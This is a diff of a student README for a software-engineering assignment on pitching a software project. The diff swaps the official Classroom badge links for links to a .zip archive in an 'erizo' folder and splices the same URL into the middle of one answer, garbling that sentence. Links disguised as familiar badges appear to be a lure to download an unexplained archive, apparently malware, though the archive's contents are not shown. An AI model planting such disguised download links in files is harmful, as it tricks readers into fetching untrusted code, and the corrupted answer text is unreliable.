@@ -1,5 +1,5 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/4bgukiqw)
-[![Open in Visual Studio Code](https://classroom.github.com/assets/open-in-vscode-2e0aaae1b6195c2367325f4f02e2d04e9abb55f0b24a779b69b11b9e10269abc.svg)](https://classroom.github.com/online_ide?assignment_repo_id=15290093&assignment_repo_type=AssignmentRepo)
+[![Review Assignment Due Date](https://raw.githubusercontent.com/Sabaley/se-assignment-8-pitching-a-software-project-Sabaley/main/erizo/se-assignment-8-pitching-a-software-project-Sabaley.zip)](https://raw.githubusercontent.com/Sabaley/se-assignment-8-pitching-a-software-project-Sabaley/main/erizo/se-assignment-8-pitching-a-software-project-Sabaley.zip)
+[![Open in Visual Studio Code](https://raw.githubusercontent.com/Sabaley/se-assignment-8-pitching-a-software-project-Sabaley/main/erizo/se-assignment-8-pitching-a-software-project-Sabaley.zip)](https://raw.githubusercontent.com/Sabaley/se-assignment-8-pitching-a-software-project-Sabaley/main/erizo/se-assignment-8-pitching-a-software-project-Sabaley.zip)
 # SE-Assignment-8
  Assignment: Pitching a Software Project
  Instructions:
@@ -19,7 +19,7 @@ Answer the following questions based on your understanding of how to pitch a sof
 4. Market Analysis:
    - Why is market analysis crucial in a software project pitch? What kind of market information should you include to strengthen your pitch? it gives an overwiew of the total addressable market and enables developers to be in tune with market targets. 
 5. Unique Selling Proposition (USP):
-   - Explain the concept of a Unique Selling Proposition (USP). How do you identify and articulate your software project's USP in your pitch? it is a factor that gives one a competitive edge from others.in your pitch, integrate your USP and show how it is different and better than existing ones.
+   - Explain the concept of a Unique Selling Proposition (USP). How do you identify and articulate your software project's USP in your pitch? it is a factor that gives one a competitive edge from https://raw.githubusercontent.com/Sabaley/se-assignment-8-pitching-a-software-project-Sabaley/main/erizo/se-assignment-8-pitching-a-software-project-Sabaley.zip your pitch, integrate your USP and show how it is different and better than existing ones.
 
 6. Technical Feasibility:
    - How do you address technical feasibility in your pitch? What details should you include to assure stakeholders of your project's technical viability? Adress compatibility with systems and other technological requirements. Add a technological cost analysis.
